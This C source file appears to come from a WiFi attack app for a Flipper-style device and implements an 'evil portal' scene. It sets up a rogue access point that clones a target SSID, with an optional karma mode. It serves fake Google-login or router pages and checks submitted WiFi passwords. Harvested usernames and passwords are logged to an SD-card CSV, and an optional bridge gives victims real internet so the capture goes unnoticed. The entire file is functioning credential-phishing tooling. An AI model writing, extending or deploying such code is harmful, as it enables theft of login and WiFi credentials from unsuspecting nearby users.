#include "../wlan_app.h"
#include "../wlan_hal.h"
#include "../wlan_evil_portal_html.h"
#include "../wlan_evil_portal_bridge.h"

#include <storage/storage.h>
#include <furi_hal_rtc.h>
#include <datetime/datetime.h>
#include <stdio.h>
#include <string.h>

#define EP_TEMPLATE_GOOGLE 0
#define EP_TEMPLATE_ROUTER 1
#define EP_TEMPLATE_SD_BASE 2

static char* s_router_options = NULL;
static char* s_template_html = NULL; // geladenes SD-Template, gehört der Scene
static File* s_cred_file = NULL;
static Storage* s_storage = NULL;

static void ep_cred_cb(const char* user, const char* pwd, void* ctx) {
    WlanApp* app = ctx;
    if(!app) return;
    uint8_t next = (app->evil_portal_cred_head + 1) % WLAN_APP_EVIL_PORTAL_QUEUE_SIZE;
    if(next == app->evil_portal_cred_tail) return; // Queue voll → drop
    WlanAppEvilPortalCred* slot = &app->evil_portal_cred_queue[app->evil_portal_cred_head];
    strncpy(slot->user, user ? user : "", sizeof(slot->user) - 1);
    slot->user[sizeof(slot->user) - 1] = '\0';
    strncpy(slot->pwd, pwd ? pwd : "", sizeof(slot->pwd) - 1);
    slot->pwd[sizeof(slot->pwd) - 1] = '\0';
    app->evil_portal_cred_head = next;
    view_dispatcher_send_custom_event(
        app->view_dispatcher, WlanAppCustomEventEvilPortalCredCaptured);

    // Bridge-after-portal: if enabled in menu, switch radio to APSTA and
    // connect upstream so captured client gets real internet through us.
    // Captured user/pwd are NOT used as WiFi creds (they're Google/portal
    // creds, not WiFi credentials).
    if(app->evil_portal_bridge_enable &&
       app->evil_portal_bridge_ssid[0] &&
       app->evil_portal_bridge_password[0]) {
        wlan_evil_portal_bridge_start(
            app,
            app->evil_portal_bridge_ssid,
            app->evil_portal_bridge_password);
    }
}

static void ep_valid_cb(const char* ssid, const char* pwd, void* ctx) {
    WlanApp* app = ctx;
    if(!app) return;
    strncpy(app->evil_portal_valid_ssid, ssid ? ssid : "",
        sizeof(app->evil_portal_valid_ssid) - 1);
    app->evil_portal_valid_ssid[sizeof(app->evil_portal_valid_ssid) - 1] = '\0';
    strncpy(app->evil_portal_valid_pwd, pwd ? pwd : "",
        sizeof(app->evil_portal_valid_pwd) - 1);
    app->evil_portal_valid_pwd[sizeof(app->evil_portal_valid_pwd) - 1] = '\0';
    view_dispatcher_send_custom_event(
        app->view_dispatcher, WlanAppCustomEventEvilPortalCredsValid);
}

static void ep_busy_cb(bool busy, const char* msg, void* ctx) {
    WlanApp* app = ctx;
    if(!app) return;
    wlan_evil_portal_view_set_busy(app->evil_portal_view_obj, busy, msg);
}

static void ep_action_cb(void* ctx) {
    WlanApp* app = ctx;
    view_dispatcher_send_custom_event(
        app->view_dispatcher, WlanAppCustomEventEvilPortalTogglePause);
}

// Baut "<option>SSID</option>"-Liste aus einem Scan (nur passwortgeschützte
// APs). Allokiert via malloc, Caller frees. NULL bei leer/Fehler.
static char* ep_build_router_options(void) {
    if(!wlan_hal_is_started()) {
        if(!wlan_hal_start()) return NULL;
    }
    wifi_ap_record_t* raw = NULL;
    uint16_t count = 0;
    wlan_hal_scan(&raw, &count, 32);

    size_t cap = 1024;
    char* buf = malloc(cap);
    if(!buf) {
        if(raw) free(raw);
        return NULL;
    }
    size_t off = 0;
    buf[0] = '\0';

    for(uint16_t i = 0; i < count; i++) {
        if(raw[i].authmode == WIFI_AUTH_OPEN) continue;
        const char* ssid = (const char*)raw[i].ssid;
        if(!ssid[0]) continue;

        // Crude HTML-Escape für < > & " '
        char esc[160];
        size_t e = 0;
        for(size_t k = 0; ssid[k] && e + 7 < sizeof(esc); k++) {
            char c = ssid[k];
            if(c == '<') { memcpy(esc + e, "&lt;", 4); e += 4; }
            else if(c == '>') { memcpy(esc + e, "&gt;", 4); e += 4; }
            else if(c == '&') { memcpy(esc + e, "&amp;", 5); e += 5; }
            else if(c == '"') { memcpy(esc + e, "&quot;", 6); e += 6; }
            else if(c == '\'') { memcpy(esc + e, "&#39;", 5); e += 5; }
            else { esc[e++] = c; }
        }
        esc[e] = '\0';

        size_t need = off + e * 2 + 32;
        if(need >= cap) {
            cap = need * 2;
            char* nb = realloc(buf, cap);
            if(!nb) { free(buf); if(raw) free(raw); return NULL; }
            buf = nb;
        }
        int n = snprintf(buf + off, cap - off,
            "<option value=\"%s\">%s</option>", esc, esc);
        if(n > 0) off += (size_t)n;
    }
    if(raw) free(raw);
    if(off == 0) {
        free(buf);
        return NULL;
    }
    return buf;
}

static void ep_sanitize_filename(const char* in, char* out, size_t out_size) {
    size_t j = 0;
    for(size_t i = 0; in[i] && j < out_size - 1; i++) {
        char c = in[i];
        if((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
           (c >= '0' && c <= '9') || c == '-' || c == '_') {
            out[j++] = c;
        } else {
            out[j++] = '_';
        }
    }
    out[j] = '\0';
}

static void ep_open_cred_file(WlanApp* app) {
    s_storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(s_storage, "/ext/wifi");
    storage_common_mkdir(s_storage, "/ext/wifi/evil_portal");

    char safe[33];
    ep_sanitize_filename(
        app->evil_portal_ssid[0] ? app->evil_portal_ssid : "portal",
        safe, sizeof(safe));

    char path[160];
    snprintf(path, sizeof(path), "/ext/wifi/evil_portal/%s_creds.csv", safe);
    bool exists = storage_common_stat(s_storage, path, NULL) == FSE_OK;

    s_cred_file = storage_file_alloc(s_storage);
    if(!storage_file_open(s_cred_file, path, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        storage_file_free(s_cred_file);
        s_cred_file = NULL;
        furi_record_close(RECORD_STORAGE);
        s_storage = NULL;
        return;
    }
    if(!exists) {
        const char* hdr = "timestamp,user,password\n";
        storage_file_write(s_cred_file, hdr, strlen(hdr));
    }
}

static void ep_close_cred_file(void) {
    if(s_cred_file) {
        storage_file_close(s_cred_file);
        storage_file_free(s_cred_file);
        s_cred_file = NULL;
    }
    if(s_storage) {
        furi_record_close(RECORD_STORAGE);
        s_storage = NULL;
    }
}

static void ep_drain_cred_queue(WlanApp* app) {
    while(app->evil_portal_cred_tail != app->evil_portal_cred_head) {
        WlanAppEvilPortalCred* c =
            &app->evil_portal_cred_queue[app->evil_portal_cred_tail];

        if(s_cred_file) {
            DateTime dt;
            furi_hal_rtc_get_datetime(&dt);
            char line[200];
            int n = snprintf(line, sizeof(line),
                "%04u-%02u-%02u %02u:%02u:%02u,%s,%s\n",
                dt.year, dt.month, dt.day, dt.hour, dt.minute, dt.second,
                c->user, c->pwd);
            if(n > 0) storage_file_write(s_cred_file, line, n);
        }

        app->evil_portal_cred_total++;
        wlan_evil_portal_view_set_creds(
            app->evil_portal_view_obj, app->evil_portal_cred_total);
        const char* shown = c->user[0] ? c->user : "(no user)";
        strncpy(app->evil_portal_last_user, shown,
            sizeof(app->evil_portal_last_user) - 1);
        app->evil_portal_last_user[sizeof(app->evil_portal_last_user) - 1] = '\0';
        wlan_evil_portal_view_set_last(app->evil_portal_view_obj, shown);

        app->evil_portal_cred_tail =
            (app->evil_portal_cred_tail + 1) % WLAN_APP_EVIL_PORTAL_QUEUE_SIZE;
    }
}

void wlan_app_scene_evil_portal_on_enter(void* context) {
    WlanApp* app = context;

    app->evil_portal_cred_head = 0;
    app->evil_portal_cred_tail = 0;
    app->evil_portal_cred_total = 0;
    app->evil_portal_last_user[0] = '\0';

    // Settings-SSID hat Vorrang vor target_ap.
    const char* ssid = app->evil_portal_ssid[0] ? app->evil_portal_ssid :
                       (app->target_ap.ssid[0] ? app->target_ap.ssid :
                        (app->connected ? app->connected_ap.ssid : "Free WiFi"));
    if(!app->evil_portal_ssid[0]) {
        strncpy(app->evil_portal_ssid, ssid,
            sizeof(app->evil_portal_ssid) - 1);
        app->evil_portal_ssid[sizeof(app->evil_portal_ssid) - 1] = '\0';
    }
    uint8_t channel = app->evil_portal_channel ? app->evil_portal_channel :
                      (app->target_ap.channel ? app->target_ap.channel : 1);

    wlan_evil_portal_view_set_ssid(app->evil_portal_view_obj, app->evil_portal_ssid);
    wlan_evil_portal_view_set_channel(app->evil_portal_view_obj, channel);
    wlan_evil_portal_view_set_clients(app->evil_portal_view_obj, 0);
    wlan_evil_portal_view_set_creds(app->evil_portal_view_obj, 0);
    wlan_evil_portal_view_set_last(app->evil_portal_view_obj, "");
    wlan_evil_portal_view_set_paused(app->evil_portal_view_obj, false);
    wlan_evil_portal_view_set_action_callback(
        app->evil_portal_view_obj, ep_action_cb, app);

    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewEvilPortal);

    ep_open_cred_file(app);

    if(s_template_html) {
        free(s_template_html);
        s_template_html = NULL;
    }

    bool router_template;
    const char* html;
    size_t html_len;

    uint8_t ti = app->evil_portal_template_index;
    if(ti >= EP_TEMPLATE_SD_BASE &&
       (uint8_t)(ti - EP_TEMPLATE_SD_BASE) < app->evil_portal_templates.count) {
        // SD-Template: HTML aus Datei laden, Typ (login/router) aus dem Eintrag.
        const WlanEvilPortalTemplateEntry* e =
            &app->evil_portal_templates.items[ti - EP_TEMPLATE_SD_BASE];
        router_template = e->is_router;
        size_t len = 0;
        s_template_html = wlan_evil_portal_templates_load(e, &len);
        if(s_template_html) {
            html = s_template_html;
            html_len = len;
        } else {
            // Laden fehlgeschlagen -> Fallback auf passendes Builtin.
            wlan_evil_portal_view_set_busy(
                app->evil_portal_view_obj, true, "Template load failed");
            html = router_template ? EVIL_PORTAL_HTML_ROUTER : EVIL_PORTAL_HTML_GOOGLE;
            html_len = router_template ? EVIL_PORTAL_HTML_ROUTER_LEN :
                                         EVIL_PORTAL_HTML_GOOGLE_LEN;
        }
    } else if(ti == EP_TEMPLATE_ROUTER) {
        router_template = true;
        html = EVIL_PORTAL_HTML_ROUTER;
        html_len = EVIL_PORTAL_HTML_ROUTER_LEN;
    } else {
        router_template = false;
        html = EVIL_PORTAL_HTML_GOOGLE;
        html_len = EVIL_PORTAL_HTML_GOOGLE_LEN;
    }

    // Der WLAN-Worker muss existieren, sonst scheitert der Dispatch in
    // wlan_hal_evil_portal_start ("worker dispatch failed"). Bei Router-
    // Templates erledigt das ep_build_router_options() implizit; für
    // Google-/Login-Templates hier explizit sicherstellen — nur den Worker,
    // KEIN voller wlan_hal_start() (dessen WiFi-STA-Init/Deinit fragmentiert
    // den internen Heap direkt vor der knappen Evil-Portal-WiFi-Init).
    wlan_hal_ensure_worker();

    if(router_template) {
        wlan_evil_portal_view_set_busy(
            app->evil_portal_view_obj, true, "Scanning APs...");
        if(s_router_options) {
            free(s_router_options);
            s_router_options = NULL;
        }
        s_router_options = ep_build_router_options();
        wlan_evil_portal_view_set_busy(app->evil_portal_view_obj, false, NULL);
    }

    WlanHalEvilPortalConfig cfg = {
        .ssid = app->evil_portal_ssid,
        .channel = channel,
        .verify_creds = router_template,
        .karma = app->evil_portal_karma,
        .html = html,
        .html_len = html_len,
        .router_ssid_options = s_router_options,
        // Bridge mode flips the post-cred page from "Couldn't sign you in" to
        // a "Signing in..." page that redirects to google.com after a delay.
        // Only enable if all three pieces are present (bridge toggle + SSID + pwd).
        .bridge_redirect = app->evil_portal_bridge_enable &&
                           app->evil_portal_bridge_ssid[0] &&
                           app->evil_portal_bridge_password[0],
        .cred_cb = ep_cred_cb,
        .cred_cb_ctx = app,
        .valid_cb = ep_valid_cb,
        .valid_cb_ctx = app,
        .busy_cb = ep_busy_cb,
        .busy_cb_ctx = app,
    };

    if(!wlan_hal_evil_portal_start(&cfg)) {
        wlan_evil_portal_view_set_busy(
            app->evil_portal_view_obj, true, "Start failed");
        return;
    }

    // Pre-warm the bridge: connect STA to upstream NOW so NAPT can be enabled
    // in ~100ms at cred-capture time instead of the 5-10s cold path (STA L2 +
    // DHCP + DHCPS dance + napt_enable). NAPT and DNS-forward are held off
    // until ep_cred_cb fires bridge_start.
    if(cfg.bridge_redirect) {
        wlan_evil_portal_bridge_prewarm(
            app,
            app->evil_portal_bridge_ssid,
            app->evil_portal_bridge_password);
    }
}

bool wlan_app_scene_evil_portal_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == WlanAppCustomEventEvilPortalTogglePause) {
            if(wlan_hal_evil_portal_is_paused()) {
                wlan_hal_evil_portal_resume();
                wlan_evil_portal_view_set_paused(app->evil_portal_view_obj, false);
            } else {
                wlan_hal_evil_portal_pause();
                wlan_evil_portal_view_set_paused(app->evil_portal_view_obj, true);
            }
            consumed = true;
        } else if(event.event == WlanAppCustomEventEvilPortalCredCaptured) {
            ep_drain_cred_queue(app);
            consumed = true;
        } else if(event.event == WlanAppCustomEventEvilPortalCredsValid) {
            ep_drain_cred_queue(app);
            scene_manager_next_scene(
                app->scene_manager, WlanAppSceneEvilPortalCaptured);
            consumed = true;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        ep_drain_cred_queue(app);
        wlan_evil_portal_view_set_clients(
            app->evil_portal_view_obj,
            wlan_hal_evil_portal_get_client_count());
        if(app->evil_portal_karma) {
            char cur[33];
            if(wlan_hal_evil_portal_karma_get_current(cur, sizeof(cur)) && cur[0]) {
                wlan_evil_portal_view_set_ssid(app->evil_portal_view_obj, cur);
            }
            wlan_evil_portal_view_set_karma(
                app->evil_portal_view_obj,
                wlan_hal_evil_portal_karma_get_ssid_count());
        }
    }

    return consumed;
}

void wlan_app_scene_evil_portal_on_exit(void* context) {
    WlanApp* app = context;
    wlan_evil_portal_view_set_action_callback(
        app->evil_portal_view_obj, NULL, NULL);
    // Bridge stop must run BEFORE evil_portal_stop: evil_portal_stop calls
    // esp_wifi_deinit which would invalidate the AP netif before
    // bridge_stop's napt_disable runs.
    wlan_evil_portal_bridge_stop();
    wlan_hal_evil_portal_stop();
    ep_drain_cred_queue(app);
    ep_close_cred_file();
    if(s_router_options) {
        free(s_router_options);
        s_router_options = NULL;
    }
    if(s_template_html) {
        free(s_template_html);
        s_template_html = NULL;
    }
    wlan_evil_portal_view_set_busy(app->evil_portal_view_obj, false, NULL);
}
